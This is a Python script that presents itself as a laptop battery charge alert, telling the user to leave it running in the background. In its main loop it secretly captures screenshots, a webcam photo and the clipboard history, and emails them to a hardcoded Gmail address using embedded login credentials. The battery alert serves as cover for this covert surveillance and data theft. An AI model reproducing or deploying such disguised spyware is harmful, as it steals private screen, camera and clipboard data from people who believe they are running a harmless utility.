import pyperclip as cb
import psutil, winsound, sys
import smtplib, pyautogui, os, cv2

from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 

multi = []
screen = 's7f3h71b49f3r.png'
maxbat, minbat = 95, 30
frequency = 2500
duration = 1000

framepic = "f7hdg645df5g3.jpg"
count = 0
hk = 'hellovickykumar'  
fromaddr = toaddr = "imvickykumar999@gmail.com"

msg = MIMEMultipart() 
msg['From'] = fromaddr 
msg['To'] = toaddr 

print('\n>>> Make Sure laptop is connected with ACTIVE Internet, and Let the Code Run in Backgroung')
print('...it will alert you when it Over or Under charge...\n', 60*'-')
msg['Subject'] = input('\nEnter your Nickname : ')

while True:
    count += 1
    pyautogui.screenshot(screen)
    
    cb.copy(cb.paste())
    if cb.paste() not in multi:
        multi.append(cb.paste())
        
    battery = psutil.sensors_battery()
    pluggedbool = battery.power_plugged
    percent = battery.percent
    
    if pluggedbool == False:
        plugged = "Not Plugged In"
    else:
        plugged = "Plugged In"
        
    print('\n', str(count), '). ', str(percent), '[', str(maxbat),
    str(minbat), ']', str(battery))
    
    vc = cv2.VideoCapture(0)
    rval, frame = vc.read()
    vc.release()
    cv2.imwrite(framepic, frame)
    
    photolist = [screen, framepic]
    for i in photolist:
        attachment = open(i, "rb") 
        body = str(multi) + '\n\n<SEPERATOR>\n\n'
        msg.attach(MIMEText(body, 'plain')) 
        
        p = MIMEBase('application', 'octet-stream') 
        p.set_payload((attachment).read()) 
        encoders.encode_base64(p) 
        p.add_header('Content-Disposition', "attachment; filename= %s" % screen) 
        msg.attach(p) 
        
        s = smtplib.SMTP('smtp.gmail.com', 587) 
        s.starttls() 
        s.login(fromaddr, hk) 
        text = msg.as_string() 
        s.sendmail(fromaddr, toaddr, text) 
        s.quit()
        
    if percent >= maxbat or percent <= minbat:
        for i in range(5):
            winsound.Beep(frequency, duration)
            time.sleep(.5)
            
        if percent >= maxbat:
            print('\nRemove Charging Plug...\n')
        else:
            print('\nInsert Charging Plug...\n')
